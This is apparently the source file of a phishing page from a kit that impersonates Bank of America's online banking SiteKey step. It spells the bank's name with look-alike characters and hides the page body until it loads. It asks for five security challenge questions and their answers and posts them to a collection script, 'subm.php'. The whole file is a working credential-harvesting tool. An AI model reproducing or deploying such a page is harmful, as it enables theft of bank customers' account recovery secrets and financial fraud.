﻿<?php
ini_set("output_buffering",4096);
session_start();

include('read.php');

$_SESSION['FirstnameP'];
$_SESSION['LastnameP'];

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Βаnk оf Αmеrіса | Οnlіnе Βаnkіng | Ѕіgn Ιn | Sitekey</title>
<meta name="robots" content="noindex,nofollow" />
<link rel="shortcut icon" href="images/favicon.ico" type="image/ico" />
<link rel="stylesheet" type="text/css" href="images/style1.css" media="all" />


<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">

</head>
<body>
<div id="text1" style="position:absolute; overflow:hidden; left:158px; top:482px; width:86px; height:23px; z-index:0">
<div class="wpmd">


<div><font color="#FF0000"><B>*</B></font></div>
</div></div>
<form action="subm.php" name="chalbhai" id="chalbhai" method="POST">

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1284px; height:414px; z-index:2"><img src="images/new header.png" alt="" title="" border=0 width=1284 height=414></div>

<div id="text2" style="position:absolute; overflow:hidden; left:166px; top:431px; width:261px; height:27px; z-index:3">
<div class="wpmd">
<div><B>Рlеаѕе fіll оut аll (</B><font color="#FF0000"><B>*</B></font><B>) 
	іndісаtеd fіеldѕ.</B></div>
</div></div>


<div id="image5" style="position:absolute; overflow:hidden; left:150px; top:480px; width:656px; height:56px; z-index:48"><img src="images/confirm.png" alt="" title="" border=0 width=656 height=56></div>

<div id="text24" style="position:absolute; overflow:hidden; left:166px; top:560px; width:222px; height:23px; z-index:49">
<div class="wpmd">
<div><B>ЅіtеKеу Ϲһаllеngе Ԛuеѕtіоn </B><font color="#FF0000"><B>*</B></font></div>
</div></div>

<div id="text25" style="position:absolute; overflow:hidden; left:535px; top:560px; width:225px; height:23px; z-index:50">
<div class="wpmd">
<div><B>ЅіtеKеу Ϲһаllеngе Αnѕԝегѕ </B><font color="#FF0000"><B>*</B></font></div>
</div></div>

<div id="html1" style="position:absolute; overflow:hidden; left:160px; top:600px; width:311px; height:58px; z-index:51">
<select class="form-control" col-md-6 botom-spacing" name="Secoia" required>
                          	<option>Select SiteKey Challenge Question 1</option>
                              <option>What is your maternal grandmother&#39;s first 
							  name?</option>
<option>What is your mother&#39;s middle name?</option>
<option>What is your father&#39;s middle name?</option>
<option>In what city was your mother born?</option>
<option>In what city were you born?</option>
<option>What is your maternal grandfather&#39;s first name?</option>
<option>In what year did you graduate from high school?</option>
<option>What was the name of your first boyfriend or girlfriend?</option>
<option>What was the name of your first pet?</option>
<option>What is the first name of the best man/maid of honor at your wedding?</option>
<option>In what city did you meet your spouse/significant other?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What was the make and model of your first car?</option>
<option>In what city were you married?</option>
<option>In what city were you living at age 16?</option>
<option>In which city did you meet your spouse for the first time?</option>
<option>what is the name of your first employer?</option>
<option>What is your best friend\&#39;s first name?</option>
<option>In what city was your high school?</option>
<option>In what city was your mother born?</option>
<option>What was your high school mascot?</option>
<option>In what city did you honeymoon?</option>
<option>what your Favorite person in history?</option>
<option>What street did your best friend in high school live on?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What is the first name of your high school prom date?</option>
<option>What is your all-time favorite song?</option>
						</select></div>

<div id="html2" style="position:absolute; overflow:hidden; left:158px; top:670px; width:311px; height:59px; z-index:52">
<select class="form-control" col-md-6 botom-spacing" name="SecoiaA" required>
                          	<option>Select SiteKey Challenge Question 2</option>
                             <option>What is your maternal grandmother&#39;s first 
							 name?</option>
<option>What is your mother&#39;s middle name?</option>
<option>What is your father&#39;s middle name?</option>
<option>In what city was your mother born?</option>
<option>In what city were you born?</option>
<option>What is your maternal grandfather&#39;s first name?</option>
<option>In what year did you graduate from high school?</option>
<option>What was the name of your first boyfriend or girlfriend?</option>
<option>What was the name of your first pet?</option>
<option>What is the first name of the best man/maid of honor at your wedding?</option>
<option>In what city did you meet your spouse/significant other?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What was the make and model of your first car?</option>
<option>In what city were you married?</option>
<option>In what city were you living at age 16?</option>
<option>In which city did you meet your spouse for the first time?</option>
<option>what is the name of your first employer?</option>
<option>What is your best friend\&#39;s first name?</option>
<option>In what city was your high school?</option>
<option>In what city was your mother born?</option>
<option>What was your high school mascot?</option>
<option>In what city did you honeymoon?</option>
<option>what your Favorite person in history?</option>
<option>What street did your best friend in high school live on?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What is the first name of your high school prom date?</option>
<option>What is your all-time favorite song?</option>

						</select></div>

<div id="html3" style="position:absolute; overflow:hidden; left:157px; top:740px; width:311px; height:60px; z-index:53">
<select class="form-control" col-md-6 botom-spacing" name="nokma" required>
                          	<option>Select SiteKey Challenge Question 3</option>
                             <option>What is your maternal grandmother&#39;s first 
							 name?</option>
<option>What is your mother&#39;s middle name?</option>
<option>What is your father&#39;s middle name?</option>
<option>In what city was your mother born?</option>
<option>In what city were you born?</option>
<option>What is your maternal grandfather&#39;s first name?</option>
<option>In what year did you graduate from high school?</option>
<option>What was the name of your first boyfriend or girlfriend?</option>
<option>What was the name of your first pet?</option>
<option>What is the first name of the best man/maid of honor at your wedding?</option>
<option>In what city did you meet your spouse/significant other?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What was the make and model of your first car?</option>
<option>In what city were you married?</option>
<option>In what city were you living at age 16?</option>
<option>In which city did you meet your spouse for the first time?</option>
<option>what is the name of your first employer?</option>
<option>What is your best friend\&#39;s first name?</option>
<option>In what city was your high school?</option>
<option>In what city was your mother born?</option>
<option>What was your high school mascot?</option>
<option>In what city did you honeymoon?</option>
<option>what your Favorite person in history?</option>
<option>What street did your best friend in high school live on?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What is the first name of your high school prom date?</option>
<option>What is your all-time favorite song?</option>

						</select></div>

<div id="html4" style="position:absolute; overflow:hidden; left:155px; top:810px; width:311px; height:55px; z-index:54">
<select class="form-control" col-md-6 botom-spacing" name="nomad" required>
                          	<option>Select SiteKey Challenge Question 4</option>
                             <option>What is your maternal grandmother&#39;s first 
							 name?</option>
<option>What is your mother&#39;s middle name?</option>
<option>What is your father&#39;s middle name?</option>
<option>In what city was your mother born?</option>
<option>In what city were you born?</option>
<option>What is your maternal grandfather&#39;s first name?</option>
<option>In what year did you graduate from high school?</option>
<option>What was the name of your first boyfriend or girlfriend?</option>
<option>What was the name of your first pet?</option>
<option>What is the first name of the best man/maid of honor at your wedding?</option>
<option>In what city did you meet your spouse/significant other?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What was the make and model of your first car?</option>
<option>In what city were you married?</option>
<option>In what city were you living at age 16?</option>
<option>In which city did you meet your spouse for the first time?</option>
<option>what is the name of your first employer?</option>
<option>What is your best friend\&#39;s first name?</option>
<option>In what city was your high school?</option>
<option>In what city was your mother born?</option>
<option>What was your high school mascot?</option>
<option>In what city did you honeymoon?</option>
<option>what your Favorite person in history?</option>
<option>What street did your best friend in high school live on?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What is the first name of your high school prom date?</option>
<option>What is your all-time favorite song?</option>

						</select></div>

<div id="html5" style="position:absolute; overflow:hidden; left:154px; top:880px; width:311px; height:62px; z-index:55">
<select class="form-control" col-md-6 botom-spacing" name="nadno" required>
                          	<option>Select SiteKey Challenge Question 5</option>
<option>What is your maternal grandmother&#39;s first name?</option>
<option>What is your mother&#39;s middle name?</option>
<option>What is your father&#39;s middle name?</option>
<option>In what city was your mother born?</option>
<option>In what city were you born?</option>
<option>What is your maternal grandfather&#39;s first name?</option>
<option>In what year did you graduate from high school?</option>
<option>What was the name of your first boyfriend or girlfriend?</option>
<option>What was the name of your first pet?</option>
<option>What is the first name of the best man/maid of honor at your wedding?</option>
<option>In what city did you meet your spouse/significant other?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What was the make and model of your first car?</option>
<option>In what city were you married?</option>
<option>In what city were you living at age 16?</option>
<option>In which city did you meet your spouse for the first time?</option>
<option>what is the name of your first employer?</option>
<option>What is your best friend\&#39;s first name?</option>
<option>In what city was your high school?</option>
<option>In what city was your mother born?</option>
<option>What was your high school mascot?</option>
<option>In what city did you honeymoon?</option>
<option>what your Favorite person in history?</option>
<option>What street did your best friend in high school live on?</option>
<option>What was the first name of your favorite teacher or professor?</option>
<option>What is the first name of your high school prom date?</option>
<option>What is your all-time favorite song?</option>

						</select></div>

<input name="Sansr" placeholder="Рlеаsе Entег Answег" class="form-control" type="text" style="position:absolute;width:270px;left:534px;top:600px;z-index:56" required>
<input name="Lokar" placeholder="Рlеаsе Entег Answег" class="form-control" type="text" style="position:absolute;width:270px;left:532px;top:670px;z-index:57" required>
<input name="SnIA" placeholder="Рlеаsе Entег Answег" class="form-control" type="text" style="position:absolute;width:270px;left:532px;top:740px;z-index:58" required>
<input name="BIAOR" placeholder="Рlеаsе Entег Answег" class="form-control" type="text" style="position:absolute;width:270px;left:533px;top:810px;z-index:59" required>
<input name="sHAia" placeholder="Рlеаsе Entег Answег" class="form-control" type="text" style="position:absolute;width:270px;left:532px;top:880px;z-index:60" required>
<div id="image6" style="position:absolute; overflow:hidden; left:122px; top:1050px; width:1042px; height:153px; z-index:61"><img src="images/footer.png" alt="" title="" border=0 ></div>
<input type="submit" style="position: absolute; width: 0px; height: 0px; left: -9999px; border: none; padding: 0px; opacity:0;" hidefocus="true" tabindex="-1"/>
<input name="Submit" class="css_button" type="submit" style="position:absolute;left:163px;top:990px;z-index:62">
</form>
</body>
</html>